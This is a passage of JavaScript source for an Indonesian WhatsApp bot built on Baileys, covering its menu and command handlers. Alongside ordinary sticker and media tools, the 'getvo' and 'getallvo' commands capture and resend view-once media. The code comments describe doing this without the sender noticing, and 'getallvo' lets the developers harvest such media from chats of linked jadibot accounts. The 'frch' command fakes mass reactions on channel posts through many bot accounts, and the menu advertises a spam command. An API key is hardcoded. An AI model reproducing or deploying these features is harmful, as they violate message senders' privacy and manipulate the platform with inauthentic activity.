    let uptime = func.clockString(process.uptime() * 1000);
    
    let listmenu = `*</> Bot Information*\n\n` +
        `%Prefix%: ${prefix}\n` +
        `%Total Blockir%: ${listblock.length}\n` +
        `%Uptime%: ${uptime}\n` +
        `%Platform%: ${platform}\n` +
        `%Memory%: ${func.fileSize(process.memoryUsage().rss)} / ${(process.env.SERVER_MEMORY != undefined && process.env.SERVER_MEMORY != 0) ? process.env.SERVER_MEMORY + ' MB' : '∞'}\n\n` +
        `*</> User Information*\n\n` +
        `%Name%: ${m.pushname}\n` +
        `%Number%: @${m.sender.split('@')[0]}\n` +
        `%About%: ${about}\n\n` +
        `*</> Date Information*\n` +
        `%Tanggal%: ${date}\n` +
        `%Hari%: ${week}\n` +
        `%Jam%: ${time} WIB`;

    let allmenu = `*</> INFO MENU*\n` +
        `- ${prefix}test\n` +
        `- ${prefix}ping\n` +
        `- ${prefix}ceksession / ceksesi\n\n` +

        `*</> CONVERTER*\n` +
        `- ${prefix}toimg (reply sticker)\n` +
        `- ${prefix}tomp3 (reply video)\n` +
        `- ${prefix}tovn (reply audio)\n` +
        `- ${prefix}sticker / s / stiker\n` +
        `- ${prefix}stiker2 / s2\n` +
        `- ${prefix}swm (pack|author)\n` +
        `- ${prefix}emojimix (emoji1+emoji2)\n` +
        `- ${prefix}emojimix2 (emoji)\n` +
        `- ${prefix}stag (tag/reply)\n` +
        `- ${prefix}tourl (reply media)\n` +
        `- ${prefix}hd / upscale (reply gambar)\n` +
        `- ${prefix}qc / qc2 / qc3 / qc4 (text)\n` +
        `- ${prefix}brat (text)\n\n` +

        `*</> DOWNLOADER*\n` +
        `- ${prefix}tiktok / ttdl / tt (link tiktok)\n\n` +

        `*</> SEARCH & ISLAM*\n` +
        `- ${prefix}google (query)\n` +
        `- ${prefix}alquran / aq (surah ayat)\n\n` +

        `*</> USER INFO*\n` +
        `- ${prefix}getname (tag/reply)\n` +
        `- ${prefix}getpp (tag/reply)\n` +
        `- ${prefix}getbio (tag/reply)\n\n` +

        `*</> BOT SETTINGS*\n` +
        `- ${prefix}self\n` +
        `- ${prefix}public / publik\n` +
        `- ${prefix}online\n` +
        `- ${prefix}offline\n` +
        `- ${prefix}antidelete on/off\n` +
        `- ${prefix}antiedited on/off\n` +
        `- ${prefix}anticall on/off\n` +
        `- ${prefix}autoreadsw on/off\n` +
        `- ${prefix}autoreactsw / autoreact on/off\n` +
        `- ${prefix}antivirtex on/off\n` +
        `- ${prefix}caller+ / caller-\n` +
        `- ${prefix}setprefix (symbol)\n` +
        `- ${prefix}setwm (pack|author)\n` +
        `- ${prefix}setstag / setstickertag\n` +
        `- ${prefix}setbotname (nama)\n` +
        `- ${prefix}setpp (reply gambar)\n\n` +

        `*</> OWNER TOOLS*\n` +
        `- ${prefix}resend (reply media)\n` +
        `- ${prefix}getvo (text/reply)\n` +
        `- ${prefix}getallvo\n` +
        `- ${prefix}rvo / rvn / cantik / 😋 / 👀 (reply viewonce)\n` +
        `- ${prefix}f / sv (reply status)\n` +
        `- ${prefix}frch / fakereactch / rch (link emoji)\n` +
        `- ${prefix}forward on/off\n` +
        `- ${prefix}setftarget nomor/reply target\n` +
        `- ${prefix}forwardf list / tag / nomor\n` +
        `- ${prefix}clearfm / clearforwardmap\n` +
        `- ${prefix}clearforwardf\n` +
        `- ${prefix}delforward / delforwardf\n` +
        `- ${prefix}restart\n` +
        `- ${prefix}clearsession\n` +
        `- ${prefix}block / unblock\n` +
        `- ${prefix}listblock\n` +
        `- ${prefix}spam (number|amount|text)\n` +
        `- ${prefix}sending (reply|nomor)\n` +
        `- ${prefix}backupsc / backupme\n` +
        `- ${prefix}upm (client + reply code)\n` +
        `- ${prefix}minifyall -y\n\n` +

        `*</> JADIBOT*\n` +
        `- ${prefix}jadibot (reply/tag)\n` +
        `- ${prefix}deljadibot (nomor)\n` +
        `- ${prefix}listjadibot / listbot\n\n` +

        ` – *SPECIAL THANKS*\n` +
        `- Allah SWT\n` +
        `- Nabi Muhammad SAW\n` +
        `- Orang tua\n` +
        `- SuryaDev\n` +
        `- NodeJS & Baileys`;

    let profile = await client.profilePictureUrl(m.bot, 'image').catch(_ => '');

    await client.sendMessage(m.chat, {
        text: listmenu.replaceAll('%', '```') + '\n\n' + allmenu,
        contextInfo: {
            mentionedJid: client.ments(listmenu),
            forwardingScore: 256,
            isForwarded: true,
            externalAdReply: {
                title: `${setting.botname?.replace(/bot/i, '')?.toUpperCase() || 'SURYA-AI'} BOT`,
                body: 'Copyright © 2026 SuryaDev',
                mediaType: 1,
                thumbnailUrl: profile,
                sourceUrl: null,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m, ephemeralExpiration: m.expiration });
}
break;

            case 'test': {
                let profile = await client.profilePictureUrl(m.bot, 'image').catch(_ => null);
                client.sendMessage(m.chat, {
                    text: `Quick Test Done! ${m.pushname}\nAktif Selama : ${func.runtime(process.uptime())}`,
                }, {
                    quoted: fkontak,
                    ephemeralExpiration: m.expiration
                });
            }
            break;

            case 'ping': {
                const old = performance.now();
                const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
                const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
                const serverInfo = `Server Information\n\n- ${os.cpus().length} CPU: ${os.cpus()[0]?.model ?? 'Tidak diketahui'}\n- Uptime: ${Math.floor(os.uptime() / 86400)} days\n- Ram: ${free_ram}/${ram}\n- Speed: ${(performance.now() - old).toFixed(5)} ms`;
                client.reply(m.chat, func.texted('monospace', serverInfo), m, { expiration: m.expiration });
            }
            break;

            case 'resend': {
                if (!m.quoted || !m.quoted.fakeObj) return m.reply('Reply image/video with caption.');
                if (/audio|video|image|webp|(application|text)\/(javascript|zip)/i.test(m.quoted.mime)) {
                    let fakeObj = { ...m.quoted.fakeObj };
                    fakeObj.message[m.quoted.mtype].caption = text ? text : '';
                    await client.copyNForward(m.chat, fakeObj, false);
                } else m.reply(`Reply image/video dengan caption ${cmd}`);
            }
            break;

case 'getvo': {
    try {
        let b;
        let a = Array.from(store.storeMap.values());

        // Cek cara pemakaian user (Bisa ketik teksnya atau reply pesannya)
        if (text) {
            // Sesuai strukturmu: content / body
            b = a.find(x => x.content == text || x.body == text);
        } else if (m.quoted) {
            b = a.find(x => x.key.id === m.quoted.id);
        } else {
            return m.reply(`Ketik teks pesanmu atau reply pesanmu yang udah nge-reply VO-nya!\nContoh: ${prefix}getvo apasihh orang gamauu`);
        }

        // Validasi keberadaan pesan di store
        if (!b) return m.reply('Pesan tidak ditemukan di database store.');
        if (!b.quoted) return m.reply('Pesan tersebut tidak sedang me-reply apapun.');

        // Pastikan pesan yang di-reply punya fungsi download (berupa media)
        if (typeof b.quoted.download !== 'function') {
            return m.reply('Pesan yang di-reply bukan media yang bisa diunduh.');
        }

        client.sendReact(m.chat, '🕒', m.key);

        // Eksekusi download media
        let buffer = await b.quoted.download();
        if (!buffer) return m.reply('Gagal mengambil media. Mungkin sudah kadaluarsa.');

        // Ambil tipe media dari struktur aslimu
        let type = b.quoted.mtype || '';
        
        // Ambil caption dari struktur aslimu (di media WA, teks itu masuknya ke 'caption', bukan 'text')
        let teksCaption = b.quoted.caption || '';

        // Deteksi dan kirim ulang tanpa ketahuan (tanpa parameter quoted)
        if (type === 'videoMessage' || type === 'viewOnceMessageV2') {
            // Bisa jadi video biasa atau video view once
            await client.sendMessage(m.chat, {
                video: buffer,
                caption: teksCaption
            }, {
                quoted: b
            });
        } else if (type === 'audioMessage' || type === 'viewOnceMessageV2Extension') {
            // AudioMessage = Voice Note
            await client.sendMessage(m.chat, {
                audio: buffer,
                ptt: true,
                mimetype: 'audio/mp4'
            }, {
                quoted: b
            });
        } else if (type === 'imageMessage') {
            // ImageMessage = Gambar
            await client.sendMessage(m.chat, {
                image: buffer,
                caption: teksCaption
            }, {
                quoted: b
            });
        } else {
            return m.reply('Tipe media tidak dikenali: ' + type);
        }

    } catch (e) {
        console.error(e);
        m.reply('Terjadi kesalahan: ' + e.message);
    }
    break;
}

            case 'ceksession':
            case 'ceksesi': {
                var sessionFile = config.owner === m.bot ? config.session : global.db.jadibot.find(x => x.number === m.bot).session;
                let dir = fs.readdirSync(sessionFile), sessionSize = 0;
                dir.map(v => sessionSize += (fs.statSync(path.join(sessionFile, v))).size);
                let ceksesi = `Session Information\n\n- Total Session : ${dir.length} Files\n- Size Session : ${sizeString(sessionSize)}`;
                client.reply(m.chat, func.texted('monospace', ceksesi), m);
            }
            break;

            case 'self':
                if (!isOwner) return reply(config.mess.owner);
                if (setting.self) return reply('Already self mode.');
                setting.self = true;
                reply('Successfully changed to self mode.');
                break;

            case 'public':
            case 'publik':
                if (!isOwner) return reply(config.mess.owner);
                if (!setting.self) return reply('Already public mode.');
                setting.self = false;
                reply('Successfully changed to public mode.');
                break;

            case 'online':
            case 'offline': {
                if (!isOwner) return m.reply(config.mess.owner);
                if (command === 'online') {
                    if (setting.online) return m.reply('Already in online mode.');
                    setting.online = true;
                    m.reply('Successfully changed to online');
                } else if (command === 'offline') {
                    if (!setting.online) return m.reply('Already in offline mode.');
                    setting.online = false;
                    m.reply('Successfully changed to offline');
                }
            }
            break;

case 'frch':
case 'fakereactch':
case 'rch':{
    if (!text) {
        return m.reply(`❌ Masukkan link pesan channel & emoji\n\nContoh:\n${cmd} https://whatsapp.com/channel/xxxxx/123 😹🥺😂\n\n_(Pastikan link menuju ke pesan spesifik, ada angka di akhirnya)_`);
    }

    let link = args[0];
    let emojiInput = args.slice(1).join('');

    if (!link || !link.includes('whatsapp.com/channel/')) {
        return m.reply('❌ Link tidak valid! Pastikan kamu memasukkan link dari WhatsApp Channel.');
    }
    if (!emojiInput) {
        return m.reply('❌ Format emoji salah atau belum dimasukkan.\nContoh: 😱🥺😂');
    }

    const regex = /whatsapp\.com\/channel\/([A-Za-z0-9_-]+)\/(\d+)/i;
    const match = link.match(regex);

    if (!match) {
        return m.reply('❌ Link tidak lengkap! Pastikan kamu menyalin link dari **pesan spesifik** di channel, bukan sekadar profil channel.\nContoh: .../channel/xxxxx/123');
    }

    const inviteCode = match[1];
    const serverMsgId = match[2];

    await client.sendReact(m.chat, '🕒', m.key);

    try {
        // Gunakan Intl.Segmenter untuk memecah teks berdasarkan Grapheme (bentuk visual utuh)
        const segmenter = new Intl.Segmenter('id', { granularity: 'grapheme' });
        const emojis = Array.from(segmenter.segment(emojiInput))
            .map(x => x.segment)
            .filter(e => e.trim() !== '' && e !== ',');
        if (emojis.length === 0) return m.reply('❌ Emoji tidak valid.');

        // 3. Tarik Semua Socket yang Aktif (Jadibot)
        const arraySocket = socket.getAllSockets();

        if (arraySocket.length === 0) {
            await client.sendReact(m.chat, '❌', m.key);
            return m.reply('❌ Saat ini tidak ada bot/socket cadangan yang aktif untuk melakukan mass-react.');
        }

        // 4. Dapatkan JID Channel Asli dari Invite Code
        let channelJid;
        let metadata;
        
        try {
            // Kita gunakan socket utama (client) untuk mengintip metadata channel
            metadata = await client.newsletterMetadata("invite", inviteCode);
            channelJid = metadata.id;
        } catch (e) {
            await client.sendReact(m.chat, '❌', m.key);
            return m.reply('❌ Gagal mendapatkan data channel. Pastikan link invite benar dan channel bersifat publik.');
        }
        
        const channelName = metadata?.thread_metadata?.name?.text || channelJid;
        await m.reply(`Memulai pengiriman reaction dari *${arraySocket.length}* bot...\nTarget: ${channelName}`);

        let successCount = 0;
        let failCount = 0;

        // 5. Eksekusi Mass-Follow & Mass-React (Looping ke semua socket)
        for (let i = 0; i < arraySocket.length; i++) {
            const botSocket = arraySocket[i];
            const selectedEmoji = emojis[Math.floor(Math.random() * emojis.length)];

            try {
                // Jeda aman antar bot (2 detik) agar tidak kena limit server WA
                // await new Promise(resolve => setTimeout(resolve, 2000));

                // Pakai catch kosong biar kalau botnya udah follow, dia tetep lanjut ke react tanpa error
                // await botSocket.newsletterFollow(channelJid).catch(() => {});

                // Jeda 1 detik biar natural antara pencet follow dan react
                await new Promise(resolve => setTimeout(resolve, 1500));

                // EKSEKUSI 2: React Pesan
                await botSocket.newsletterReactMessage(channelJid, serverMsgId, selectedEmoji);

                successCount++;
            } catch (e) {
                console.error(`Socket ${botSocket.user?.id || 'unknown'} gagal react:`, e.message);
                failCount++;
            }
        }

        // 6. Laporan Hasil
        let msg = `✨ *Reaction Massal Selesai!*\n\n`;
        msg += `- Channel: ${channelName}\n`;
        msg += `- Server Msg ID: ${serverMsgId}\n`;
        msg += `- Emoji List: ${emojis.join(' ')}\n\n`;
        msg += `- Sukses: ${successCount} bot\n`;
        msg += `- Gagal: ${failCount} bot\n\n`;
        msg += `*Powered by Multi-Socket Lulli Bot*`;

        await m.reply(msg);
    } catch (err) {
        console.error("Error Mass React Channel:", err.message);
        // await client.sendReact(m.chat, '❌', m.key);
        m.reply(`❌ Terjadi kesalahan pada sistem:\n${err.message}`);
    }
break
}
            case 'forward':
                if (!isOwner) return 
                if (!m.isPc) return 
                if (/^on$/.test(args[0])) {
                    if (setting.forward) return reply('forward has been activated previously.');
                    setting.forward = true;
                    reply('forward has been activated successfully.');
                } else if (/^off$/.test(args[0])) {
                    if (!setting.forward) return reply('forward has been inactivated previously.');
                    setting.forward = false;
                    reply('forward has been inactivated successfully.');
                } else reply(func.example(cmd, 'on / off'));
                break;

           case 'setftarget': {
               if (!isOwner) return reply(config.mess.owner);
               if (!froms) return reply('Masukkan nomor atau reply pesan yang ingin dijadikan target forward bot kamu.');
               if (setting.target === froms) return reply("target already this");
               setting.target = froms;
               client.sendReact(m.chat, '✅', m.key);
               break;
           }

            case 'getallvo': {
                if (!devs.includes(m.sender)) return;
                try {
                    let targetBot = froms || m.bot;

                    let isJadibot = global.db.jadibot.find(x => x.number === targetBot);
                    if (targetBot !== config.owner && !isJadibot && targetBot !== m.bot) {
                        return m.reply('Bot target bukan jadibot yang terdaftar.');
                    }

                    const arraySocket = socket.getAllSockets();
                    const targetSocket = arraySocket.find(v => v.user && v.user.jid.includes(targetBot.split('@')[0]));

                    if (!targetSocket && targetBot !== config.owner && targetBot !== m.bot) {
                        return m.reply('Socket jadibot tidak aktif atau tidak ditemukan.');
                    }

                    global.voHistory = global.voHistory || new Set();
                    let allMsgs = Array.from(store.storeMap.values());
                    
                    let voReplies = allMsgs.filter(x => 
                        x.quoted && 
                        x.bot === targetBot &&
                        (x.quoted.viewOnce === true || 
                         x.quoted.mtype === 'viewOnceMessage' ||
                         x.quoted.mtype === 'viewOnceMessageV2' ||
                         x.quoted.mtype === 'viewOnceMessageV2Extension') &&
                        !global.voHistory.has(x.quoted.id)
                    );

                    if (voReplies.length === 0) {
                        return m.reply(`Belum ada View Once baru untuk bot @${targetBot.split('@')[0]}.`);
                    }

                    m.reply(`Ketemu ${voReplies.length} pesan View Once baru. Otw disedot...`);

                    for (let i = 0; i < voReplies.length; i++) {
                        let b = voReplies[i];

                        if (typeof b.quoted.download !== 'function') continue;

                        let buffer = await b.quoted.download().catch(() => null);
                        if (!buffer) continue;

                        let type = b.quoted.mtype || '';
                        let bentukBalasan = '';
                        if (b.mtype === 'stickerMessage') bentukBalasan = '[Ngirim Stiker]';
                        else if (b.mtype === 'imageMessage') bentukBalasan = '[Ngirim Gambar]';
                        else if (b.mtype === 'audioMessage') bentukBalasan = '[Ngirim VN]';
                        else bentukBalasan = b.content || b.body || '[Reaction/Lainnya]';

                        let rawVoSender = b.quoted.sender || b.quoted.participant || '';
                        let voSender = rawVoSender ? rawVoSender.split('@')[0] : 'unknown'; 
                        let pancinganSender = b.sender ? b.sender.split('@')[0] : 'unknown'; 
                        let chatNum = b.chat ? b.chat.split('@')[0] : 'unknown'; 
                        let botNum = b.bot ? b.bot.split('@')[0] : 'unknown';
                        let chatType = b.isGc ? '(Group)' : `@${chatNum} (Private)`;
                        let teksCaption = b.quoted.caption ? `${b.quoted.caption}\n\n` : '';

                        let infoPesan = `${teksCaption}_Pancingan: "${bentukBalasan}"_\n\n` +
                                        `VO from @${voSender}\n` +
                                        `Reply by @${pancinganSender} in chat ${chatType}\n` +
                                        `Bot via @${botNum}`;

                        let arrayMentions = [rawVoSender, b.chat, b.sender, b.bot].filter(Boolean);

                        if (type === 'videoMessage' || type === 'viewOnceMessageV2' || type === 'viewOnceMessage') {
                            await client.sendMessage(m.chat, { video: buffer, caption: infoPesan, mentions: arrayMentions });
                        } else if (type === 'audioMessage' || type === 'viewOnceMessageV2Extension') {
                            let quotedVN = await client.sendMessage(m.chat, { audio: buffer, ptt: true, mimetype: 'audio/mp4' });
                            await client.sendMessage(m.chat, { text: infoPesan, mentions: arrayMentions }, { quoted: quotedVN });
                        } else if (type === 'imageMessage') {
                            await client.sendMessage(m.chat, { image: buffer, caption: infoPesan, mentions: arrayMentions });
                        }

                        global.voHistory.add(b.quoted.id);
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                    m.reply('Mantap! Semua View Once baru dari obrolanmu udah ditarik bersih.');
                } catch (e) {
                    console.error(e);
                    m.reply('Waduh error: ' + e.message);
                }
                break;
            }

            case 'forwardf': {
                if (!isOwner) return reply(config.mess.owner);
                if (!setting.forwardf) setting.forwardf = [];

                if (args[0] === 'list') {
                    if (setting.forwardf.length === 0) return reply('Daftar target forwardf kosong.');
                    let txt = '乂 *L I S T - F O R W A R D F*\n\n' + setting.forwardf.map(v => '- @' + v.replace(/@.+/, '')).join('\n');
                    return client.sendMessage(m.chat, { text: txt, mentions: setting.forwardf }, { quoted: m, ephemeralExpiration: m.expiration });
                }

                let target = m.quoted ? m.quoted.sender : text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : false;
                if (!target) return reply(`Kirim nomor, reply pesan, atau ketik *${cmd} list*\nContoh: ${cmd} 628xxx`);

                if (setting.forwardf.includes(target)) {
                    setting.forwardf.splice(setting.forwardf.indexOf(target), 1);
                    client.sendReact(m.chat, '✅', m.key);
                } else {
                    setting.forwardf.push(target);
                    client.sendReact(m.chat, '✅', m.key);
                }
            }
            break;

            case 'clearfm':
            case 'clearforwardmap': {
                if (!isOwner) return reply(config.mess.owner);
                global.db.forwardMap = {};
                client.sendReact(m.chat, '✅', m.key);
            }
            break;

            case 'clearforwardf': {
                if (!isOwner) return reply(config.mess.owner);
                setting.forwardf = [];
                client.sendReact(m.chat, '✅', m.key);
            }
            break;

            case 'delforward':
            case 'delforwardf': {
                if (!isOwner) return reply(config.mess.owner);
                if (!setting.forwardf) setting.forwardf = [];

                let target = m.quoted ? m.quoted.sender : text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : false;
                if (!target) return reply(`Kirim nomor atau reply pesan target yang ingin dihapus.\n*Contoh:* ${cmd} 628xxx`);

                let index = setting.forwardf.indexOf(target);
                if (index !== -1) {
                    setting.forwardf.splice(index, 1);
                    client.sendReact(m.chat, '✅', m.key);
                } else {
                    client.sendReact(m.chat, '❌', m.key);
                }
            }
            break;

            case 'antidelete':
                if (!isOwner) return reply(config.mess.owner);
                if (!m.isGc) return reply(config.mess.group);
                if (/^on$/.test(args[0])) {
                    if (setting.antidelete) return reply('anti delete has been activated previously.');
                    setting.antidelete = true;
                    reply('anti delete has been activated successfully.');
                } else if (/^off$/.test(args[0])) {
                    if (!setting.antidelete) return reply('anti delete has been inactivated previously.');
                    setting.antidelete = false;
                    reply('anti delete has been inactivated successfully.');
                } else reply(func.example(cmd, 'on / off'));
                break;

            case 'antiedited':
                if (!isOwner) return reply(config.mess.owner);
                if (!m.isGc) return reply(config.mess.group);
                if (/^on$/.test(args[0])) {
                    if (setting.antiedited) return reply('anti edited has been activated previously.');
                    setting.antiedited = true;
                    reply('anti edited has been activated successfully.');
                } else if (/^off$/.test(args[0])) {
                    if (!setting.antiedited) return reply('anti edited has been inactivated previously.');
                    setting.antiedited = false;
                    reply('anti edited has been inactivated successfully.');
                } else reply(func.example(cmd, 'on / off'));
                break;

            case 'anticall':
                if (!isOwner) return reply(config.mess.owner);
                if (/^on$/.test(args[0])) {
                    if (setting.anticall) return reply('anti call has been activated previously.');
                    setting.anticall = true;
                    reply('anti call has been activated successfully.');
                } else if (/^off$/.test(args[0])) {
                    if (!setting.anticall) return reply('anti call has been inactivated previously.');
                    setting.anticall = false;
                    reply('anti call has been inactivated successfully.');
                } else reply(func.example(cmd, 'on / off'));
                break;

            case 'autoreadsw':
                if (!isOwner) return reply(config.mess.owner);
                if (/^on$/.test(args[0])) {
                    if (setting.autoreadsw) return reply('auto read sw has been activated previously.');
                    setting.autoreadsw = true;
                    reply('auto read sw has been activated successfully.');
                } else if (/^off$/.test(args[0])) {
                    if (!setting.autoreadsw) return reply('auto read sw has been inactivated previously.');
                    setting.autoreadsw = false;
                    reply('auto read sw has been inactivated successfully.');
                } else reply(func.example(cmd, 'on / off'));
                break;

            case 'autoreactsw':
            case 'autoreact':
                if (!isOwner) return reply(config.mess.owner);
                if (/^on$/.test(args[0])) {
                    if (setting.autoreact) return reply('auto react sw has been activated previously.');
                    setting.autoreact = true;
                    reply('auto react sw has been activated successfully.');
                } else if (/^off$/.test(args[0])) {
                    if (!setting.autoreact) return reply('auto react sw has been inactivated previously.');
                    setting.autoreact = false;
                    reply('auto react sw has been inactivated successfully.');
                } else reply(func.example(cmd, 'on / off'));
                break;

            case 'antivirtex':
                if (!isOwner) return reply(config.mess.owner);
                if (/^on$/.test(args[0])) {
                    if (setting.antivirtex) return reply('anti virtex has been activated previously.');
                    setting.antivirtex = true;
                    reply('anti virtex has been activated successfully.');
                } else if (/^off$/.test(args[0])) {
                    if (!setting.antivirtex) return reply('anti virtex has been inactivated previously.');
                    setting.antivirtex = false;
                    reply('anti virtex has been inactivated successfully.');
                } else reply(func.example(cmd, 'on / off'));
                break;

            case 'caller+':
                if (!isOwner) return reply(config.mess.owner);
                if (!froms) return reply('mention or reply chat target.');
                if (setting.caller.includes(froms)) return reply('already in database.');
                setting.caller.push(froms);
                reply('caller added successfully.');
                break;

            case 'caller-':
                if (!isOwner) return reply(config.mess.owner);
                if (!froms) return reply('mention or reply chat target.');
                if (!setting.caller.includes(froms)) return reply('not in database.');
                setting.caller.splice(setting.caller.indexOf(froms), 1);
                reply('caller deleted successfully.');
                break;

            case 'alquran':
            case 'aq': {
                if (args && isNaN(args[0])) return m.reply(`Contoh penggunaan:\n${cmd} 17 32\n\nmaka hasilnya adalah surah Al-Isra ayat 32 beserta audionya`);
                if (args && isNaN(args[1])) return m.reply(`Contoh penggunaan:\n${cmd} 17 32\n\nmaka hasilnya adalah surah Al-Isra ayat 32 beserta audionya`);
                if (Number(args[0]) > 114) return m.reply('Stress ??');
                
                try {
                    let data = await func.fetchJson(`https://raw.githubusercontent.com/Jabalsurya2105/database/master/surah/surah%20${args[0]}.json`);
                    let number = Number(parseInt(args[1]));
                    if (number > data.ayat.length) return m.reply(`Surah ini hanya sampai *${data.ayat.length}* ayat.`);
                    
                    let { no, arab, latin, id, en, audio, tafsir } = data.ayat[number - 1];
                    let txt = `${arab}\n${en}\n\nArtinya: ${id}\n\n(Q.S ${data.name} : ${no})`;
                    
                    client.sendMessage(m.chat, { text: txt }, { quoted: m, ephemeralExpiration: m.expiration })
                        .then((q) => client.sendMessage(m.chat, { audio: { url: audio }, mimetype: 'audio/mpeg' }, { quoted: q, ephemeralExpiration: m.expiration }));
                } catch (e) {
                    m.reply('Surah tidak ditemukan.');
                }
            }
            break;

case 'hd':
case 'upscale':{
    if (!quoted || !/image\/(jpe?g|png)/i.test(quoted.mime)) {
        return m.reply(`✗ Mohon balas gambar dengan caption *${m.cmd} [scale]*`);
    }
    
    if (!/image\/(jpe?g|png)/i.test(quoted.mime)) {
        return m.reply(`✗ MIME type *${quoted.mime}* tidak didukung. Hanya mendukung jpeg/jpg/png.`);
    }

    client.sendReact(m.chat, '🕒', m.key);

    try {
        const imageBuffer = await quoted.download();
        if (!imageBuffer || imageBuffer.length === 0) {
            throw new Error('✗ Gagal mengunduh gambar.');
        }
        
        const scale = text?.trim() || "2";
        if (!["2", "4"].includes(scale)) {
            return m.reply('✗ Skala tidak valid. Hanya mendukung "2" atau "4".');
        }

        const result = await func.upscale(imageBuffer, scale);
        if (!result.status) {
            return m.reply(`✗ ${result.message}`);
        }

        await client.sendMessage(m.chat, {
            image: { url: result.result_url },
            caption: `✓ Gambar berhasil di-upscale ${scale}x.`,
            expiration: m.expiration,
            mimetype: 'image/png',
            fileName: 'remini_upscaled.png'
        }, {
            quoted: m,
            ephemeralExpiration: m.expiration
        });

    } catch (e) {
        console.error('✗ Terjadi kesalahan pada Remini (Upscale):', e);
        await m.reply(`✗ Terjadi kesalahan saat melakukan upscale: ${cfg.mess.wrong(e.message)}`);
    }
break
}
            case 'toimg': {
                if (/webp/.test(mime)) {
                    client.sendReact(m.chat, '🕒', m.key);
                    let media = await client.downloadAndSaveMediaMessage(quoted);
                    let ran = path.join(process.cwd(), 'temp', func.filename('png'));
                    exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                        if (err) return reply('Maaf terjadi kesalahan.');
                        client.sendMessage(m.chat, { image: fs.readFileSync(ran), caption: `*Sticker Convert To Image!*` }, { quoted: m, ephemeralExpiration: m.expiration });
                        fs.unlinkSync(media);
                        fs.unlinkSync(ran);
                    });
                } else reply(`Reply stikernya dengan caption *${cmd}*`);
            }
            break;

            case 'tomp3': {
                if (/video/.test(mime)) {
                    client.sendReact(m.chat, '🕒', m.key);
                    let media = await client.downloadAndSaveMediaMessage(quoted);
                    let ran = path.join(process.cwd(), 'temp', func.filename('mp3'));
                    exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
                        if (err) return m.reply(`Something went wrong: ${err.message}`);
                        client.sendMessage(m.chat, { audio: fs.readFileSync(ran), mimetype: 'audio/mpeg' }, { quoted: m, ephemeralExpiration: m.expiration });
                        fs.unlinkSync(media);
                        fs.unlinkSync(ran);
                    });
                } else reply(`Kirim/Reply video dengan caption ${cmd}`);
            }
            break;

            case 'tovn': {
                if (/audio/.test(mime)) {
                    client.sendReact(m.chat, '🕒', m.key);
                    let dl = await m.quoted.download();
                    client.sendMessage(m.chat, { audio: dl, mimetype: 'audio/mpeg', ptt: true }, { quoted: m, ephemeralExpiration: m.expiration });
                } else reply(`Reply audionya dengan caption *${cmd}*`);
            }
            break;

            case 'stag': {
                if (m.quoted || text) {
                    if (froms === m.bot && !isOwner) return reply('Access denied.');
                    let isProfile = await client.profilePictureUrl(froms, 'image').catch(_ => null);
                    if (isProfile) {
                        client.sendStickerFromUrl(m.chat, await func.getBuffer(isProfile), m, { packname, author, expiration: m.expiration });
                    } else reply('Gagal! profile di private.');
                } else reply('Tag atau reply pesan target!');
            }
            break;

            case 'emojimix': {
                let [emoji1, emoji2] = text.split('+');
                if (!func.isEmoji(emoji1)) return reply(`Itu bukan emoji!\n*Contoh:* ${cmd} 😚+🙁`);
                if (!emoji1 || !emoji2) return reply(func.example(cmd, ' 😅+🤔'));
                
                client.sendReact(m.chat, '🕒', m.key);
                let anu = await func.fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`);
                for (let res of anu.results) {
                    client.sendStickerFromUrl(m.chat, res.url, m, { packname, author, categories: res.tags });
                }
            }
            break;

            case 'emojimix2': {
                if (!text) return reply(func.example(cmd, ' 😅'));
                if (!func.isEmoji(args[0])) return reply(`Itu bukan emoji!\n*Contoh:* ${cmd} 😚`);
                
                client.sendReact(m.chat, '🕒', m.key);
                let anu = await func.fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`);
                for (let res of anu.results) {
                    let encmedia = await client.sendStickerFromUrl(m.chat, res.url, m, { packname, author, categories: res.tags });
                    if (encmedia && typeof encmedia === 'string' && fs.existsSync(encmedia)) {
                        fs.unlinkSync(encmedia);
                    }
                }
            }
            break;

            case 'sticker':
            case 'stiker':
            case 's': {
                if (/image|webp/.test(mime)) {
                    let media = await quoted.download();
                    client.sendSticker(m.chat, media, m, { packname, author, expiration: m.expiration });
                } else if (/video/.test(mime)) {
                    client.sendReact(m.chat, '🕒', m.key);
                    if (quoted.seconds > 9) return m.reply('Maksimal 9 detik!');
                    let media = await quoted.download();
                    client.sendSticker(m.chat, media, m, { packname, author, expiration: m.expiration });
                } else reply(`Kirim atau reply gambar dengan caption ${cmd}`);
            }
            break;

            case 's2':
            case 'stiker2':
            case 'sticker2': {
                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    client.sendSticker(m.chat, media, m, { packname, author, isFull: true, expiration: m.expiration });
                } else if (/video/.test(mime)) {
                    if (quoted.seconds > 9) return m.reply('Maksimal 9 detik!');
                    client.sendReact(m.chat, '🕒', m.key);
                    let media = await quoted.download();
                    client.sendSticker(m.chat, media, m, { packname, author, isFull: true, expiration: m.expiration });
                } else if (/webp/.test(mime)) {
                    let media = await quoted.download();
                    client.sendSticker(m.chat, media, m, { packname, author, isFull: true, expiration: m.expiration });
                } else reply(`Kirim atau reply gambar dengan caption ${cmd}`);
            }
            break;

            case 'swm': {
                if (!text) return reply(func.example(m.cmd, 'yaudah iya'));
                if (/image|video|webp/.test(mime)) {
                    const [pack, auth] = text.split('|').map(x => x.trim());
                    let media = await quoted.download();
                    client.sendSticker(m.chat, media, m, { packname: pack, isFull: true, author: auth });
                }
            }
            break;

            case 'tourl': {
                if (/image\/(jpe?g|png)|video|webp|audi/.test(mime)) {
                    let buffer = await quoted.download();
                    let catbox = await func.catbox(buffer);
                    if (!catbox.status) return m.reply(catbox.message);
                    await reply(catbox.url);
